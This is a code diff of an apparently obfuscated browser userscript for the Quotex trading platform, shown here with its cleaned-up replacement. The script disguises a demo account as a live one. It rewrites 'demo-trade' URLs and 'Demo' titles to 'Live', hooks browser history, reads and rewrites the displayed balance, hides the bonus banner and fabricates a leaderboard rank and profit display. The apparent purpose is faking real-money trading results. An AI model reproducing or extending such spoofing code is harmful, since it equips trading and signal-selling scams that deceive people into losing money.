+  // --- 4. CONFIGURATION & STABLE URL/TITLE GUARDS ---
+  const BACKEND_URL = "https://zeroxpremiumquotexlivecode.onrender.com";
+
+  const sanitizeDemoUrl = (rawUrl) => {
+      if (!rawUrl || typeof rawUrl !== 'string') return rawUrl;
+      return rawUrl.replace(/demo-trade/gi, 'trade');
   };
-  _83 = function () {
-    return 267582 ^ 267574;
-  }();
-  var _84 = _0[203];
-  const _mi = () => {
-    try {
-      const _mj = window[_0[204]][_0[205]];
-      if (/demo-trade/i[_0[133]](_mj)) {
-        const _mk = _mh(_mj);
-        if (_mk !== _mj) {
-          window[_0[206]][_0[207]](window[_0[206]][_0[208]], _0[3], _mk);
-        }
+
+  const cleanUrl = () => {
+      try {
+          const currentHref = window.location.href;
+          if (/demo-trade/i.test(currentHref)) {
+              const targetHref = sanitizeDemoUrl(currentHref);
+              if (targetHref !== currentHref) {
+                  window.history.replaceState(window.history.state, '', targetHref);
+              }
+          }
+      } catch(e) {}
+  };
+
+  const cleanTitle = () => {
+      if (document.title.includes('Demo') || document.title.includes('demo')) {
+          document.title = document.title.replace(/demo/gi, 'Live');
       }
-    } catch (e) {}
   };
-  _84 = function () {
-    return _0[203];
-  }();
-  var _85 = _0[209];
-  const _ml = () => {
-    if (document[_0[210]][_0[18]](_0[47][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) || document[_0[210]][_0[18]](_0[34][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))) {
-      document[_0[210]] = document[_0[210]][_0[50]](/demo/gi, _0[52][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-    }
-  };
-  _85 = (104881 ^ 104885) + (484283 ^ 484280);
-  if (!window[_0[211]]) {
-    window[_0[211]] = function () {
-      return !![];
-    }();
-    var _86 = function (s, h) {
-      return s ^ h;
-    }(358048, 358051);
-    const _mm = history[_0[212]];
-    _86 = (323316 ^ 323317) + (388229 ^ 388229);
-    var _87 = function (s, h) {
-      return s ^ h;
-    }(271636, 271635);
-    const _mn = history[_0[207]];
-    _87 = function () {
-      return _0[213];
-    }();
-    history[_0[212]] = function (state, title, url) {
-      var _88 = function (s, h) {
-        return s ^ h;
-      }(904466, 904471);
-      const _mo = typeof url === _0[46][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) ? _mh(url) : url;
-      _88 = function () {
-        return 275472 ^ 275475;
-      }();
-      var _89 = _0[214];
-      const res = _mm[_0[49]](this, state, title, _mo);
-      _89 = (813449 ^ 813453) + (450702 ^ 450697);
-      _ml();
-      return res;
-    };
-    history[_0[207]] = function (state, title, url) {
-      var _90 = _0[215];
-      const _oh = typeof url === _0[46][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) ? _mh(url) : url;
-      _90 = (746272 ^ 746280) + (417233 ^ 417235);
-      if (typeof url === _0[46][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) && _oh === window[_0[204]][_0[205]]) {
-        _ml();
-        return undefined;
-      }
-      var _91 = _0[216];
-      const res = _mn[_0[49]](this, state, title, _oh);
-      _91 = (492841 ^ 492845) + (360385 ^ 360385);
-      _ml();
-      return res;
-    };
+
+  if(!window.qxHistoryPatched){
+      window.qxHistoryPatched = true;
+      const originalPushState = history.pushState;
+      const originalReplaceState = history.replaceState;
+
+      history.pushState = function(state, title, url){
+          const safeUrl = typeof url === 'string' ? sanitizeDemoUrl(url) : url;
+          const res = originalPushState.call(this, state, title, safeUrl);
+          cleanTitle();
+          return res;
+      };
+
+      history.replaceState = function(state, title, url){
+          const safeUrl = typeof url === 'string' ? sanitizeDemoUrl(url) : url;
+          if (typeof url === 'string' && safeUrl === window.location.href) {
+              cleanTitle();
+              return undefined;
+          }
+          const res = originalReplaceState.call(this, state, title, safeUrl);
+          cleanTitle();
+          return res;
+      };
   }
-  _mi();
-  _ml();
-  window[_0[200]](_0[217][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), () => {
-    _mi();
-    _ml();
+
+  cleanUrl();
+  cleanTitle();
+  window.addEventListener('popstate', () => {
+      cleanUrl();
+      cleanTitle();
   });
-  window[_0[81]] = setInterval(() => {
-    _mi();
-    _ml();
-  }, 810768 ^ 810868);
-  function _1nm() {
-    var _92 = _0[218];
-    const _qa = document[_0[29]](_0[170][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-    _92 = function () {
-      return _0[218];
-    }();
-    if (_qa) {
-      var _93 = function (s, h) {
-        return s ^ h;
-      }(161457, 161462);
-      const sr = _qa[_0[16]] || _qa[_0[17]];
-      _93 = function () {
-        return _0[219];
-      }();
-      var _94 = function (s, h) {
-        return s + h;
-      }(438231 ^ 438227, 277415 ^ 277413);
-      const _qb = sr ? sr[_0[29]](_0[171][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) : null;
-      _94 = function () {
-        return _0[220];
-      }();
-      var _95 = function (s, h) {
-        return s ^ h;
-      }(604835, 604843);
-      const raw = _qb ? _qb[_0[38]] : sr ? sr[_0[38]] : _qa[_0[38]];
-      _95 = (746496 ^ 746500) + (846425 ^ 846426);
-      var _96 = _0[221];
-      const m = (raw || _0[3])[_0[174]](/\$\s*([\d,\s\u00a0]+(?:\.\d+)?)/);
-      _96 = function () {
-        return _0[221];
-      }();
+
+  window.qxUrlForceInterval = setInterval(() => {
+      cleanUrl();
+      cleanTitle();
+  }, 100);
+
+  // --- 5. CORE HELPER FUNCTIONS ---
+  function getBalance(){
+    const trigger = document.querySelector('qx-usermenu-trigger');
+    if (trigger) {
+      const sr = trigger.shadowRoot || trigger.__zeroxShadowRoot;
+      const balEl = sr ? sr.querySelector('.balance, [class*="balance"]') : null;
+      const raw = balEl ? balEl.textContent : (sr ? sr.textContent : trigger.textContent);
+      const m = (raw || '').match(/\$\s*([\d,\s\u00a0]+(?:\.\d+)?)/);
       if (m) {
-        var _97 = function (s, h) {
-          return s ^ h;
-        }(775400, 775401);
-        const n = parseFloat(m[214231 ^ 214230][_0[50]](/[\s\u00a0,]/g, _0[3]));
-        _97 = function () {
-          return 854067 ^ 854065;
-        }();
-        if (Number[_0[128]](n) && n >= (695223 ^ 695223) && n < 100000000) return n;
+        const n = parseFloat(m[1].replace(/[\s\u00a0,]/g, ''));
+        if (Number.isFinite(n) && n >= 0 && n < 100000000) return n;
       }
     }
-    var _98 = function (s, h) {
-      return s ^ h;
-    }(141652, 141660);
-    const all = _1n8(_0[222][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-    _98 = (506832 ^ 506835) + (384513 ^ 384514);
-    for (const el of all) {
-      if (el[_0[136]] && el[_0[136]][_0[178]] === _0[125]) continue;
-      var _99 = function (s, h) {
-        return s ^ h;
-      }(695197, 695199);
-      const _tw = el[_0[38]][_0[127]]();
-      _99 = function () {
-        return 296492 ^ 296495;
-      }();
-      if (!_tw[_0[18]](_0[121])) continue;
-      if (/live\s+account|demo\s+account|daily\s+limit/i[_0[133]](_tw)) continue;
-      var _100 = _0[223];
-      const _tx = _tw[_0[50]](/,/g, _0[3])[_0[50]](_0[121], _0[3])[_0[50]](/LIVE/gi, _0[3])[_0[50]](/DEMO/gi, _0[3])[_0[127]]();
-      _100 = function () {
-        return _0[223];
-      }();
-      var _101 = function (s, h) {
-        return s ^ h;
-      }(384503, 384503);
-      const n = parseFloat(_tx);
-      _101 = (286662 ^ 286659) + (271025 ^ 271026);
-      if (Number[_0[128]](n) && n >= (990155 ^ 990155) && n < 100000000) {
+
+    const all = queryAllDeep('.zt1hG, header div, header span, .v2KPX');
+    for(const el of all){
+      if (el.dataset && el.dataset.qxSyncedLiveBalance === '1') continue;
+      const text = el.textContent.trim();
+      if(!text.includes('$')) continue;
+      if(/live\s+account|demo\s+account|daily\s+limit/i.test(text)) continue;
+      const clean = text.replace(/,/g,'').replace('$','').replace(/LIVE/gi,'').replace(/DEMO/gi,'').trim();
+      const n = parseFloat(clean);
+      if(Number.isFinite(n) && n >= 0 && n < 100000000){
         return n;
       }
     }
     return null;
   }
-  function _1nn() {
-    var _102 = function (s, h) {
-      return s + h;
-    }(432820 ^ 432817, 298128 ^ 298134);
-    const _ty = document[_0[12]](_0[224][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-    _102 = function () {
-      return _0[225];
-    }();
-    _ty[_0[165]](el => {
-      var _103 = function (s, h) {
-        return s ^ h;
-      }(553817, 553819);
-      const _tz = el[_0[38]] || _0[3];
-      _103 = function () {
-        return 544340 ^ 544339;
-      }();
-      if (_tz[_0[18]](_0[226][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) || _tz[_0[18]](_0[227][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) || _tz[_0[18]](_0[228][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))) {
-        if (el[_0[229]] > (893960 ^ 893960) && el[_0[229]] < (404241 ^ 404097)) {
-          el[_0[230]][_0[231]](_0[232][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[233][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        }
-      }
-    });
+
+  function removeBonusBanner() {
+      const allDivs = document.querySelectorAll('div, section, aside');
+      allDivs.forEach(el => {
+          const text = el.textContent || '';
+          if(text.includes('50% bonus') || text.includes('bonus on your deposit') || text.includes('Get a 50%')){
+              if(el.offsetHeight > 0 && el.offsetHeight < 400){
+                  el.style.setProperty('display', 'none', 'important');
+              }
+          }
+      });
   }
-  var _104 = _0[235];
-  const _u0 = _1nm();
-  _104 = function () {
-    return _0[235];
-  }();
-  window[_0[236]] = _u0 !== null ? _u0[_0[237]]() : _0[238];
-  if (window[_0[239]] === undefined) {
-    window[_0[239]] = _0[240][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-  }
-  window[_0[241]] = _0[242][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-  var _105 = _0[243];
-  const _u1 = {
-    '\u0042\u0061\u006e\u0067\u006c\u0061\u0064\u0065\u0073\u0068': _0[244][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]),
-    '\u0049\u006e\u0064\u0069\u0061': _0[245][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]),
-    '\u0055\u006e\u0069\u0074\u0065\u0064\u0020\u0053\u0074\u0061\u0074\u0065\u0073': _0[246][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]),
-    '\u0055\u006e\u0069\u0074\u0065\u0064\u0020\u004b\u0069\u006e\u0067\u0064\u006f\u006d': _0[247][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]),
-    '\u0043\u0061\u006e\u0061\u0064\u0061': _0[248][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]),
-    '\u0041\u0075\u0073\u0074\u0072\u0061\u006c\u0069\u0061': _0[249][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]),
-    '\u0055\u006e\u0069\u0074\u0065\u0064\u0020\u0041\u0072\u0061\u0062\u0020\u0045\u006d\u0069\u0072\u0061\u0074\u0065\u0073': _0[250][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]),
-    '\u0053\u0061\u0075\u0064\u0069\u0020\u0041\u0072\u0061\u0062\u0069\u0061': _0[251][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]),
-    '\u0050\u0061\u006b\u0069\u0073\u0074\u0061\u006e': _0[252][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])
-  };
-  _105 = function () {
-    return _0[243];
-  }();
-  var _106 = _0[253];
-  const _u2 = document[_0[254]](_0[255][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-  _106 = function () {
-    return _0[253];
-  }();
-  _u2[_0[256]] = _0[86][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-  _u2[_0[38]] = `
+
+  // --- 6. INJECT STYLES (EXACT REAL 20x20 ICON & NATURAL PC BOX SIZE) ---
+  const style = document.createElement('style');
+  style.id = 'qx-combined-style';
+  style.textContent = `
       .v2KPX {
         display: inline-flex !important;
         align-items: center !important;
@@ -1124,15 +681,6 @@ var _0 = ["matchMedia", ")xp967 :htdiw-nim(", "split", "", "reverse", "join", "m
         width: 100% !important;
         height: 100% !important;
       }
-      .qx-leaderboard-flag {
-        width: 18px !important;
-        height: 13px !important;
-        object-fit: cover !important;
-        border-radius: 2px !important;
-        margin-right: 6px !important;
-        vertical-align: middle !important;
-        display: inline-block !important;
-      }
       svg.icon-academic,
       .v2KPX svg:not(.qx-level-icon) {
         display: none !important;
@@ -1185,1115 +733,416 @@ var _0 = ["matchMedia", ")xp967 :htdiw-nim(", "split", "", "reverse", "join", "m
         height: 0 !important;
       }
   `;
-  document[_0[257]][_0[57]](_u2);
-  var _107 = _0[258];
-  const _u3 = document[_0[254]](_0[255][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-  _107 = function () {
-    return _0[258];
-  }();
-  _u3[_0[256]] = _0[96][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-  _u3[_0[38]] = `
-    .qx-profit-card{ position:relative!important; }
-    .qx-profit-original-line{ border-bottom-color:transparent!important; }
-    .qx-profit-line{
-      position:absolute!important;
-      height:2px!important;
-      left:10px!important;
-      bottom:auto!important;
-      top:39px!important;
-      width:0%;
-      background:#0faf59!important;
-      z-index:999999!important;
-      pointer-events:none!important;
-      transition: width .35s ease, background-color .2s ease!important;
-    }
-  `;
-  document[_0[257]][_0[57]](_u3);
-  function _1no() {
-    return [...document[_0[12]](_0[259][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))][_0[260]](el => {
-      var _108 = function (s, h) {
-        return s + h;
-      }(727263 ^ 727258, 594484 ^ 594492);
-      const t = (el[_0[261]] || _0[3])[_0[127]]();
-      _108 = function () {
-        return 382011 ^ 382013;
-      }();
-      return t[_0[18]](_0[240][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) && t[_0[18]](_0[262][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) && /\$?-?[\d,]+(?:\.\d+)?/[_0[133]](t) && el[_0[263]]()[_0[264]] > (767273 ^ 767443) && el[_0[263]]()[_0[265]] > (414021 ^ 414071) && el[_0[263]]()[_0[265]] < (101053 ^ 100913);
-    });
-  }
-  function _1np() {
-    var _109 = function (s, h) {
-      return s + h;
-    }(902675 ^ 902679, 712964 ^ 712963);
-    const _u4 = _1no();
-    _109 = function () {
-      return 607112 ^ 607116;
-    }();
-    if (!_u4) return;
-    _u4[_0[266]][_0[267]](_0[268][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-    var _110 = function (s, h) {
-      return s + h;
-    }(229350 ^ 229344, 242312 ^ 242314);
-    let _u5 = _u4[_0[29]](_0[269][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-    _110 = (730086 ^ 730086) + (880996 ^ 880994);
-    if (!_u5) {
-      _u5 = document[_0[254]](_0[259][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      _u5[_0[270]] = _0[271][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-      _u4[_0[57]](_u5);
-    }
-    var _111 = function (s, h) {
-      return s ^ h;
-    }(413256, 413258);
-    const _u6 = _1nm();
-    _111 = (210428 ^ 210429) + (160403 ^ 160411);
-    if (_u6 === null) return;
-    var _112 = function (s, h) {
-      return s + h;
-    }(197055 ^ 197051, 201877 ^ 201878);
-    const _u7 = parseFloat((window[_0[236]] || _0[3])[_0[50]](/[^0-9.]/g, _0[3])) || 743907 ^ 743907;
-    _112 = (733828 ^ 733827) + (290418 ^ 290427);
-    var _113 = function (s, h) {
-      return s ^ h;
-    }(614189, 614184);
-    const _u8 = function (s, h) {
-      return s - h;
-    }(_u6, _u7);
-    _113 = (818205 ^ 818202) + (311838 ^ 311835);
-    if (Math[_0[272]](_u8) < 0.000001) {
-      _u5[_0[230]][_0[264]] = _0[273][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-      _u5[_0[230]][_0[274]] = _0[275][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-      return;
-    }
-    if (_u8 < (895904 ^ 895904)) {
-      var _114 = function (s, h) {
-        return s + h;
-      }(734544 ^ 734550, 662063 ^ 662063);
-      const _u9 = Math[_0[272]](_u8);
-      _114 = function () {
-        return _0[276];
-      }();
-      var _115 = function (s, h) {
-        return s ^ h;
-      }(189608, 189611);
-      let _ua = function (s, h) {
-        return s - h;
-      }(930135 ^ 930121, _u9 / (761380 ^ 763068) * (586366 ^ 586343));
-      _115 = function () {
-        return 191008 ^ 191012;
-      }();
-      _ua = Math[_0[277]](344107 ^ 344110, Math[_0[278]](402790 ^ 402808, _ua));
-      _u5[_0[230]][_0[264]] = _ua + _0[279];
-      _u5[_0[230]][_0[274]] = _0[275][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-      return;
-    }
-    var _116 = function (s, h) {
-      return s ^ h;
-    }(537219, 537217);
-    const _ub = Math[_0[272]](_u8);
-    _116 = (889974 ^ 889970) + (251948 ^ 251946);
-    var _117 = function (s, h) {
-      return s + h;
-    }(570490 ^ 570482, 591495 ^ 591488);
-    let _uc = function (s, h) {
-      return s + h;
-    }(740444 ^ 740418, _ub / (233784 ^ 240544) * (962575 ^ 962621));
-    _117 = function () {
-      return _0[280];
-    }();
-    _uc = Math[_0[277]](893127 ^ 893145, Math[_0[278]](486468 ^ 486420, _uc));
-    _u5[_0[230]][_0[264]] = _uc + _0[279];
-    _u5[_0[230]][_0[274]] = _0[275][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-  }
-  function _1nq(card, positionText) {
-    var _118 = function (s, h) {
-      return s + h;
-    }(211907 ^ 211911, 706841 ^ 706846);
-    let _ud = ![];
-    _118 = function () {
-      return 784376 ^ 784380;
-    }();
-    card[_0[12]](_0[281][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))[_0[165]](el => {
-      if (_ud) return;
-      var _119 = function (s, h) {
-        return s + h;
-      }(975688 ^ 975688, 990074 ^ 990075);
-      const _ue = (el[_0[38]] || _0[3])[_0[127]]();
-      _119 = (262497 ^ 262499) + (408511 ^ 408502);
-      if (_ue !== _0[282] && _ue !== _0[283][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) && !/^\d{1,3}$/[_0[133]](_ue)) return;
-      var _120 = _0[284];
-      const _uf = el[_0[148]];
-      _120 = (792234 ^ 792238) + (444839 ^ 444847);
-      var _121 = function (s, h) {
-        return s ^ h;
-      }(568999, 568996);
-      const _ug = _uf ? _uf[_0[148]] : null;
-      _121 = (628945 ^ 628948) + (780678 ^ 780677);
-      var _122 = _0[285];
-      const _uh = _uf ? _uf[_0[38]] || _0[3] : _0[3];
-      _122 = function () {
-        return 729509 ^ 729516;
-      }();
-      var _123 = function (s, h) {
-        return s + h;
-      }(531139 ^ 531138, 293408 ^ 293411);
-      const _ui = _ug ? _ug[_0[38]] || _0[3] : _0[3];
-      _123 = function () {
-        return 802630 ^ 802631;
-      }();
-      if (_uh[_0[18]](_0[286][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) || _ui[_0[18]](_0[286][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))) {
-        el[_0[38]] = positionText;
-        _ud = function () {
-          return !![];
-        }();
-      }
-    });
-    if (_ud) return;
-    var _124 = _0[287];
-    const _uj = document[_0[143]](card, NodeFilter[_0[144]], null, ![]);
-    _124 = function () {
-      return _0[287];
-    }();
-    var _125 = function (s, h) {
-      return s ^ h;
-    }(882300, 882297);
-    let _uk;
-    _125 = function () {
-      return _0[288];
-    }();
-    while (_uk = _uj[_0[146]]()) {
-      var _126 = function (s, h) {
-        return s + h;
-      }(235947 ^ 235951, 458641 ^ 458642);
-      const _ul = (_uk[_0[38]] || _0[3])[_0[127]]();
-      _126 = function () {
-        return 182583 ^ 182577;
-      }();
-      if (_ul !== _0[282] && _ul !== _0[283][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) && !/^\d{1,3}$/[_0[133]](_ul)) continue;
-      var _127 = function (s, h) {
-        return s ^ h;
-      }(355186, 355189);
-      const _um = _uk[_0[148]];
-      _127 = function () {
-        return 659721 ^ 659722;
-      }();
-      if (!_um) continue;
-      var _128 = function (s, h) {
-        return s + h;
-      }(345424 ^ 345424, 286796 ^ 286794);
-      const _un = _um[_0[148]] ? _um[_0[148]][_0[38]] || _0[3] : _0[3];
-      _128 = function () {
-        return 279876 ^ 279875;
-      }();
-      if (_un[_0[18]](_0[286][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))) {
-        _uk[_0[38]] = positionText;
-        break;
-      }
-    }
-  }
-  function _1nr() {
-    var _129 = function (s, h) {
-      return s + h;
-    }(260956 ^ 260949, 687907 ^ 687914);
-    const _uo = _1no();
-    _129 = function () {
-      return 136446 ^ 136443;
-    }();
-    if (!_uo) return;
-    var _130 = function (s, h) {
-      return s + h;
-    }(305431 ^ 305439, 110084 ^ 110087);
-    const _up = _1nm();
-    _130 = function () {
-      return _0[289];
-    }();
-    if (_up === null) return;
-    var _131 = function (s, h) {
-      return s ^ h;
-    }(859598, 859592);
-    const _uq = parseFloat((window[_0[236]] || _0[3])[_0[50]](/[^0-9.]/g, _0[3])) || 840497 ^ 840497;
-    _131 = function () {
-      return _0[290];
-    }();
-    var _132 = function (s, h) {
-      return s ^ h;
-    }(237786, 237787);
-    const _ur = function (s, h) {
-      return s - h;
-    }(_up, _uq);
-    _132 = function () {
-      return _0[291];
-    }();
-    if (Math[_0[272]](_ur) < 0.000001) {
-      _1nq(_uo, _0[282]);
-      return;
-    }
-    if (_ur < (928657 ^ 928657)) {
-      _1nq(_uo, _0[283][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      return;
-    }
-    var _133 = function (s, h) {
-      return s ^ h;
-    }(105540, 105537);
-    const _us = Math[_0[272]](_ur);
-    _133 = (398520 ^ 398522) + (368461 ^ 368457);
-    var _134 = _0[292];
-    const _ut = [];
-    _134 = function () {
-      return 871724 ^ 871717;
-    }();
-    var _135 = _0[293];
-    const _uu = new Set();
-    _135 = (944169 ^ 944175) + (792997 ^ 792998);
-    document[_0[12]](_0[294][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))[_0[165]](el => {
-      if (_uo[_0[295]](el)) return;
-      var _136 = function (s, h) {
-        return s + h;
-      }(149724 ^ 149720, 470915 ^ 470917);
-      const _uv = (el[_0[261]] || _0[3])[_0[50]](/\s+/g, _0[296])[_0[127]]();
-      _136 = function () {
-        return 934550 ^ 934551;
-      }();
-      if (!_uv || _uv[_0[9]] > (707087 ^ 707259)) return;
-      var _137 = function (s, h) {
-        return s + h;
-      }(887495 ^ 887489, 591150 ^ 591150);
-      const _uw = _uv[_0[174]](/^(\d{1,3})\s+.*?\$([\d,]+(?:\.\d+)?)(?:\+)?\s*$/);
-      _137 = (986984 ^ 986989) + (174884 ^ 174880);
-      if (!_uw) return;
-      var _138 = _0[297];
-      const _ux = parseInt(_uw[730452 ^ 730453], 366213 ^ 366223);
-      _138 = function () {
-        return _0[297];
-      }();
-      var _139 = _0[298];
-      const _uy = parseFloat(_uw[500017 ^ 500019][_0[50]](/,/g, _0[3]));
-      _139 = function () {
-        return 945025 ^ 945032;
-      }();
-      if (!Number[_0[128]](_ux) || !Number[_0[128]](_uy) || _ux < (614612 ^ 614613) || _ux > (977844 ^ 976979) || _uy <= (624495 ^ 624495)) return;
-      var _140 = _0[299];
-      const key = function (s, h) {
-        return s + h;
-      }(_ux + _0[300], _uy);
-      _140 = (439734 ^ 439734) + (191395 ^ 191399);
-      if (_uu[_0[301]](key)) return;
-      _uu[_0[267]](key);
-      _ut[_0[19]]({
-        rank: _ux,
-        amount: _uy
-      });
-    });
-    _ut[_0[302]]((a, b) => a[_0[303]] - b[_0[303]]);
-    var _141 = _0[304];
-    let _wr = null;
-    _141 = (276534 ^ 276531) + (399381 ^ 399376);
-    for (const row of _ut) {
-      if (_us > row[_0[305]]) {
-        _wr = row[_0[303]];
-        break;
-      }
-    }
-    if (_wr === null) {
-      var _142 = _0[306];
-      const _yk = _ut[_0[130]](row => row[_0[305]] > _us)[_0[9]];
-      _142 = (414109 ^ 414110) + (894042 ^ 894043);
-      _wr = _yk + (920877 ^ 920876);
-    }
-    var _143 = function (s, h) {
-      return s ^ h;
-    }(472017, 472022);
-    const _yl = _wr >= (706711 ^ 706710) && _wr <= (185413 ^ 185425) ? String(_wr) : _0[283][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-    _143 = (331054 ^ 331050) + (786589 ^ 786581);
-    _1nq(_uo, _yl);
-  }
-  function _1ns() {
-    var _144 = _0[307];
-    const _ym = _1nm();
-    _144 = (248754 ^ 248756) + (183353 ^ 183355);
-    if (_ym !== null && (!window[_0[236]] || window[_0[236]] === _0[238])) {
-      window[_0[236]] = _ym[_0[237]]();
-    }
-    var _145 = function (s, h) {
-      return s + h;
-    }(845592 ^ 845596, 391350 ^ 391345);
-    const _yn = window[_0[239]] || _0[240][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-    _145 = function () {
-      return _0[308];
-    }();
-    var _146 = function (s, h) {
-      return s + h;
-    }(309721 ^ 309725, 116335 ^ 116326);
-    const _yo = parseFloat((window[_0[236]] || _0[3])[_0[50]](/[^0-9.]/g, _0[3])) || _ym || 180573 ^ 180573;
-    _146 = (758620 ^ 758619) + (939666 ^ 939667);
-    var _147 = function (s, h) {
-      return s + h;
-    }(243088 ^ 243094, 211397 ^ 211405);
-    const _yp = _ym !== null ? _ym - _yo : 470796 ^ 470796;
-    _147 = (876905 ^ 876906) + (583945 ^ 583948);
-    var _148 = function (s, h) {
-      return s + h;
-    }(409340 ^ 409332, 286885 ^ 286884);
-    const _yq = Math[_0[272]](_yp);
-    _148 = function () {
-      return 877489 ^ 877492;
-    }();
-    var _149 = function (s, h) {
-      return s + h;
-    }(137202 ^ 137202, 951721 ^ 951712);
-    const _yr = function (s, h) {
-      return s + h;
-    }(_0[121], _yq[_0[122]](_0[123][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), {
-      minimumFractionDigits: 410836 ^ 410838,
-      maximumFractionDigits: 138406 ^ 138404
-    }));
-    _149 = (378653 ^ 378649) + (105598 ^ 105592);
-    var _150 = function (s, h) {
-      return s + h;
-    }(233274 ^ 233275, 783070 ^ 783070);
-    const _ys = function (s, h) {
-      return s < h;
-    }(_yp, 841031 ^ 841031);
-    _150 = function () {
-      return _0[309];
-    }();
-    var _151 = function (s, h) {
-      return s ^ h;
-    }(242762, 242766);
-    const _yt = _0[242][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-    _151 = (796359 ^ 796356) + (845038 ^ 845039);
-    var _152 = function (s, h) {
-      return s ^ h;
-    }(288373, 288380);
-    const _yu = _u1[_yt] || _0[244][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-    _152 = function () {
-      return 955283 ^ 955287;
-    }();
-    var _153 = function (s, h) {
-      return s + h;
-    }(247148 ^ 247146, 776949 ^ 776945);
-    const _yv = `https://flagcdn.com/24x18/${_yu}.png`;
-    _153 = function () {
-      return _0[310];
-    }();
-    var _154 = function (s, h) {
-      return s + h;
-    }(173302 ^ 173298, 455450 ^ 455448);
-    const _yw = document[_0[12]](_0[259][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-    _154 = function () {
-      return _0[311];
-    }();
-    for (let div of _yw) {
-      if (div[_0[38]][_0[18]](_0[286][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) && !div[_0[38]][_0[18]](_0[312][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) && div[_0[38]][_0[9]] < (407674 ^ 407894)) {
-        var _155 = function (s, h) {
-          return s + h;
-        }(232699 ^ 232699, 619148 ^ 619149);
-        const _10z = document[_0[143]](div, NodeFilter[_0[144]], null, ![]);
-        _155 = function () {
-          return _0[313];
-        }();
-        var _156 = _0[314];
-        let node;
-        _156 = function () {
-          return _0[314];
-        }();
-        while (node = _10z[_0[146]]()) {
-          if (node[_0[38]][_0[18]](_0[286][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))) {
-            node[_0[38]] = _0[262][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-          }
-        }
-        var _157 = function (s, h) {
-          return s ^ h;
-        }(842305, 842311);
-        let _13m = ![];
-        _157 = function () {
-          return 209041 ^ 209044;
-        }();
-        var _158 = function (s, h) {
-          return s + h;
-        }(369081 ^ 369081, 303790 ^ 303787);
-        let _13n = div[_0[12]](_0[315][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _158 = function () {
-          return 678783 ^ 678775;
-        }();
-        for (let el of _13n) {
-          if (el[_0[132]][_0[9]] === (160948 ^ 160948)) {
-            var _159 = function (s, h) {
-              return s ^ h;
-            }(707934, 707929);
-            let t = el[_0[38]][_0[127]]();
-            _159 = function () {
-              return 618986 ^ 618987;
-            }();
-            if (t[_0[18]](_0[121]) || t[_0[316]](_0[282]) && t[_0[18]](_0[317])) {
-              el[_0[38]] = _yr;
-              el[_0[230]][_0[231]](_0[318][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _ys ? _0[319][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) : _0[275][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
